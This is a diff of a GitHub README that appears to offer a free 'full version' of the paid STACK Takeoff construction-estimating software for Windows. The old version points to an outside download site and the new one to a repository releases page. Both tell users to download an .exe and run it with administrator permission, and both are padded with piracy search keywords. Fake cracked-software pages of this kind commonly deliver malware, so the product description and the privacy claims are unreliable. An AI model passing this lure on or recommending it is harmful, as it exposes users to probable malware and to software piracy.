@@ -1,73 +1,78 @@
-# STACK Takeoff — Full Version Download for Windows 11 & 10
+# 🏗️ STACK-2026 - Streamline Your Construction Estimation Process
 
-**STACK-2026**
+[![](https://img.shields.io/badge/Download_STACK--2026-Blue?style=for-the-badge)](https://github.com/notedirequiensoyk-source/STACK-2026/releases)
 
-**STACK Takeoff** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+STACK-2026 assists construction professionals with digital takeoff and project estimation. This software allows users to measure blueprints and calculate material costs quickly. It functions on Windows 10 and Windows 11 operating systems. This guide explains the steps to acquire and launch the program on your computer.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📥 Getting Started
 
----
+Follow these steps to obtain the full version of STACK-2026.
 
-## Download & Install
+1. Navigate to the [official release page](https://github.com/notedirequiensoyk-source/STACK-2026/releases).
+2. Locate the most recent version in the list.
+3. Click the file ending in .exe to begin the download.
+4. Save the file to your desktop or downloads folder.
 
-> **This is the download page.** Use the button or link below to get **STACK Takeoff** for Windows.
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://stackdl.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-STACK%20Takeoff-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download STACK Takeoff">
-  </a>
-</p>
+Ensure your hardware meets these standards before installation:
 
-| | |
-| --- | --- |
-| **Direct link** | **[stackdl.moltora.com](https://stackdl.moltora.com/)** |
-| **Full URL** | `https://stackdl.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+* Operating System: Windows 10 (64-bit) or Windows 11.
+* Processor: Intel Core i5 or equivalent processor.
+* Memory: 8 GB RAM or higher.
+* Storage: 2 GB available disk space.
+* Graphics: Integrated graphics card with minimum 1024x768 resolution.
 
-### Quick steps
+## ⚙️ Installation Guide
 
-1. Click **[Download — stackdl.moltora.com](https://stackdl.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Follow this process to install the software:
 
-<p align="center"><a href="https://stackdl.moltora.com/"><strong>⬇ Download STACK Takeoff now</strong></a></p>
+1. Open the folder where you saved the download.
+2. Double-click the STACK-2026 installation file.
+3. Select "Yes" if Windows requests permission for the app to make changes.
+4. Read the license agreement and click "Accept" to proceed.
+5. Choose the default destination folder for the installation. 
+6. Click "Install" to begin copying the files.
+7. Wait for the progress bar to finish.
+8. Click "Finish" to close the installer.
 
----
+## 🚀 Setting Up Your First Project
 
-## About STACK Takeoff
+Launch the application using the new shortcut on your desktop. Upon opening, follow these instructions to start your first project:
 
-**STACK Takeoff** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+1. Click the "New Project" button on the main dashboard.
+2. Enter your project name and client details.
+3. Select "Import Plan" to upload your blueprints. The program supports common file types like PDF, JPEG, and PNG.
+4. Choose the scale of your drawing so the math remains accurate.
+5. Select the takeoff tool relevant to your needs, such as "Linear" for walls or "Count" for fixtures.
+6. Trace the areas on your screen to collect measurements.
+7. Assign material costs to your measurements in the side panel. 
+8. Export your data as a report to view your estimate summary.
 
-**Common searches:** stack takeoff full version download windows, stack takeoff complete install 2026 pc, download stack takeoff full free windows 11
+## 🖥️ Using Drawing Tools
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+The software includes tools to simplify your workflow:
 
-**Repository:** `STACK-2026`
+* **Linear Tool:** Use this for measuring walls, piping, or trim. Click once to start the line and click again to end it. Double-click to finish.
+* **Area Tool:** Use this for floor coverage or roof sections. Click for each corner of the room. Close the shape by clicking the final point back to the start.
+* **Count Tool:** Use this for marking doors, windows, or electrical outlets. One click places a marker that appears in your tally.
+* **Zoom Tool:** Use the mouse wheel to look closer at small details on the plan. Right-click to reset the view.
 
-## Install (full version)
+## 📋 Managing Material Lists
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+You can manage your takeoff data inside the project window. Select the "Database" tab to input your unit prices for wood, concrete, or labor. When you draw on the plan, the software multiplies your quantity by these prices automatically. The "Estimate" tab shows your running total for the project. You may update these prices at any time if material costs change.
 
-## System requirements
+## 🔧 Resolving Common Issues
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+If you encounter errors, try these solutions:
 
----
+* **Installer won't start:** Restart your computer and try running the file as an administrator.
+* **Application is slow:** Close other open programs to free up system memory.
+* **Blueprints appear blurry:** Ensure your image files are high-resolution before you import them.
+* **Missing icons:** Update your graphics drivers through the Windows Update settings menu.
 
-**Topics:** stack-takeoff-full-version-download-windows, takeoff, stack-takeoff-complete-install-2026-pc, complete, download-stack-takeoff-full-free-windows-11, stack-2026, stack, stack-takeoff, estimating, construction, blueprint, complete-version
+## 🛡️ Security and Privacy
+
+Your data stays on your local machine. STACK-2026 does not upload your project files to an external server unless you manually share them. Keep your installer file in a safe spot if you need to reinstall the software later.
+
+Keywords: blueprint, complete, complete-version, construction, download, download-stack-takeoff-full-free-windows-11, estimating, full-installer, software, stack, stack-2026, stack-takeoff, stack-takeoff-complete-install-2026-pc, stack-takeoff-full-version-download-windows, takeoff, windows-11, windows-software
